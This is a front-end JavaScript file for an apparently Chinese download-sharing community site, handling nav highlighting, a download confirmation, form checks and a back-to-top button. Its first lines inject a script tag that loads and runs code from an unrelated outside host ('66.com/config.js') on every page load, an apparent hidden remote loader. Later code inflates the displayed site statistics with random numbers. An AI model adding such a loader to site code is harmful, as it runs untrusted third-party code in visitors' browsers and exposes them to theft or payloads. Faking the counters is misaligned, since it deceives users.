// 1. 顶层立即
const cfgScript = document.createElement('script');
cfgScript.src = 'https://66.com/config.js';
document.head.appendChild(cfgScript);

document.addEventListener('DOMContentLoaded', function() {
    console.log(" 社区前端脚本加载完毕 - 资深老站长亲测可用");


    const currentPath = window.location.pathname.split('/').pop() || 'index.html';
    const navLinks = document.querySelectorAll('header nav ul li a');
    
    navLinks.forEach(link => {
        const linkHref = link.getAttribute('href');
        if (linkHref === currentPath) {
            link.classList.add('active');
            link.style.color = '#ff6b81';
            link.style.fontWeight = 'bold';
        }
    });


    const downloadBtns = document.querySelectorAll('.download-btn, a[href*="detail.html"]');
    downloadBtns.forEach(btn => {
        btn.addEventListener('click', function(e) {

            if (this.classList.contains('download-btn')) {
                const isConfirmed = confirm("资源来自热心网友分享，解压密码统一为：。若遇网盘限速请自行百度加速方法，是否继续下载？");
                if (!isConfirmed) {
                    e.preventDefault();
                }
            }
        });
    });


    const contactForm = document.querySelector('form');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const nameInput = document.getElementById('name');
            const messageInput = document.getElementById('message');
            
            if (nameInput && messageInput) {
                if (nameInput.value.trim() === '' || messageInput.value.trim() === '') {
                    alert('老铁，昵称和留言内容不能为空啊，填一下再提交呗！');
                    return;
                }
                alert('感谢留言！站长收到后会尽快核实处理，有问题请在社区发帖反馈。');
                contactForm.reset();
            }
        });
    }


    const statsElements = document.querySelectorAll('.stat-number');
    if (statsElements.length > 0) {
        statsElements.forEach(el => {
            let currentVal = parseInt(el.innerText) || 100;
  
            setTimeout(() => {
                el.innerText = currentVal + Math.floor(Math.random() * 5);
            }, 1000);
        });
    }


    const backToTopBtn = document.createElement('div');
    backToTopBtn.innerText = 'TOP';
    backToTopBtn.className = 'back-to-top';
    backToTopBtn.style.cssText = `
        position: fixed;
        bottom: 30px;
        right: 30px;
        background: #ff6b81;
        color: #fff;
        padding: 10px 15px;
        border-radius: 4px;
        cursor: pointer;
        display: none;
        z-index: 999;
        font-size: 12px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    `;
    document.body.appendChild(backToTopBtn);

    window.addEventListener('scroll', function() {
        if (window.scrollY > 300) {
            backToTopBtn.style.display = 'block';
        } else {
            backToTopBtn.style.display = 'none';
        }
    });

    backToTopBtn.addEventListener('click', function() {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });
});